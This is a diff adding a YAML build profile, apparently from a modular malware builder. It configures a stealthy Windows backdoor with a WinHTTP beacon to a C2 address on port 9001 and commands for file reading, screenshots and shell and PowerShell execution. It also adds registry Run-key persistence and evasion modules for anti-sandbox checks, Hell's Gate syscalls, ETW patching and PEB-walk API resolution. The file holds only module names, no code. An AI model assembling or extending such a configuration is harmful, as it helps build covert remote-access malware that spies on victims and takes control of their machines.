@@ -1,0 +1,26 @@
+name: backdoor_http_stealth_v4_heavy
+description: "WinHTTP backdoor \u2014 minimal API commands, max stealth profile"
+core:
+- core/emit_buffer
+- core/file_ops
+c2: c2/winhttp_beacon
+commands:
+- commands/cmd_sysinfo
+- commands/cmd_fileread
+- commands/cmd_screenshot
+- commands/cmd_exec
+- commands/cmd_exec_powershell
+arch: arch/backdoor
+persist: persist/registry_run
+resources: true
+evasion:
+- evasion/behavioral_pacing
+- evasion/anti_sandbox
+- evasion/triggered_exec
+- evasion/hells_gate
+- evasion/etw_patch
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
+  BEACON_INTERVAL_MS: '60000'
+api_resolve: api_resolve/peb_walk
